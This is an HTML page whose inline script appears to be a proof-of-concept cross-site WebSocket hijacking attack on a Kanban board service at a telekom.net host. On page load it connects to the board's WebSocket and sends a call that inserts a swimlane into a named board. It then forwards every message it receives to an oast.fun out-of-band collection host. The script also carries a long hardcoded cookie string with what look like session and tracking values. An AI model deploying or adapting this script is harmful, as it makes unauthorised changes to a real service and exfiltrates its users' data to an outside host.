<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket and Fetch Example</title>
</head>
<body>

<script>
    var ws = new WebSocket('wss://board.automation.telekom.net/sockjs/675/0ruxings/websocket');

    ws.onopen = function() {
        // WebSocket connection is open, send login message
       var loginMessage = {
            msg: 'method',
            id: '13',
            method: '/swimlanes/insert',
            params: [{
                title: 'kioa1',
                boardId: 'vE5g7xpFtg7HCoe3x',
                sort: 1,
                type: 'swimlane',
                archived: false,
                createdAt: { $date: 1700901626703 },
                updatedAt: { $date: 1700901626703 },
                modifiedAt: { $date: 1700901626703 }
            }],
            randomSeed: '680c13428d4c01ee4203'
        };
        ws.send(JSON.stringify(loginMessage));
    };

    ws.onmessage = function(event) {
        // Message received from WebSocket server
        var receivedData = event.data;

        console.log('Received data:', receivedData); // Log the received data

        // Send the received data to another URL using fetch
        fetch('https://cjc0vtf2vtc0000a344ggjgyp7ryyyyyb.oast.fun', {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'Cookie': 'wt3_eid=%3B865234457892410%7C2168356627767536043%3B692691450673132%7C4170019955900588708; rl_anonymous_id=%22c16e2ed2-f5a6-4368-a187-4c39c7172ce8%22; rl_user_id=%22%22; _ga_34C7VSJDLB=GS1.1.1700197299.13.1.1700197923.0.0.0; _ga=GA1.1.410715221.1683567358; _ga_2382461GRF=GS1.1.1698262053.7.0.1698262055.0.0.0; _gcl_au=1.1.630071995.1698262063; wt_nv=0; __ctmou_lej6ogei=cuid-1698262064416-Ll83dtxN.1698262537178; _fbp=fb.1.1698262068350.120511208; wt_rla=274375378620546%2C1%2C1698262308870%3B865234457892410%2C2%2C1698262319880%3B423493631852538%2C6%2C1700199562914%3B692691450673132%2C9%2C1700199562945%3B786452015021125%2C1%2C1698262537178%3B835283281675898%2C1%2C1698262537179; utag_main=v_id:018bdbca5e49001b8dccc91700d205050002800d00bd0$_sn:1$_se:3$_ss:0$_st:1700201399227$ses_id:1700199554634%3Bexp-session$_pn:3%3Bexp-session; CONSENTMGR=consent:true%7Cts:1700199555766%7Cc1:1%7Cc3:1%7Cc7:1; utag_chat=skill:gk-omni-sales$timestamp:1700199590279; x_mtok=yqvMGoufPCMC5Djos'
                // Add any other headers you may need
            },
            body: receivedData // Send the received data as-is
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Server response:', data);
            // Handle the server response as needed
        })
        .catch(error => {
            console.error('Error during fetch operation:', error);
            // Handle errors
        });
    };
</script>

</body>
</html>
